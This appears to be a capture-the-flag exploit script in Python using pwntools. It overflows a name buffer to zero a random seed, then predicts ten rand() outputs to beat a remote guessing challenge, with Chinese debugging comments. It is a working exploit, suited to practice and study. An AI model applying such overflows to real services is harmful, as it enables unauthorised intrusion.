from pwn import *
from ctypes import *

r = remote('61.147.171.105', 53254)
context.log_level = 'debug'

# 导入对应C标准动态库
libc = cdll.LoadLibrary("./libc.so.6")

'''
# 调试溢出offset为：20
pwndbg> search 'AAAA'
Searching for byte: b'AAAA'
[stack]         0x7ffde536d610 'AAAAAAAA'
[stack]         0x7ffde536d614 0x41414141 /* 'AAAA' */
pwndbg> distance 0x7ffde536d610 $rbp
0x7ffde536d610->0x7ffde536d5f0 is -0x20 bytes (-0x4 words)
'''
# cat_flag = 0x000C3E
# payload = b'A' * 0x20 + p64(0) + p64(cat_flag)  # 开了canary，无法执行
payload = b'A' * 0x20 + p64(0)  # 覆盖seed变量为0
r.sendlineafter(b'name:', payload)
libc.srand(0)
# 需要连续猜对10次
for i in range(10):
    num = str(libc.rand() % 6 + 1)
    r.sendlineafter(b'number:', num)
r.interactive()
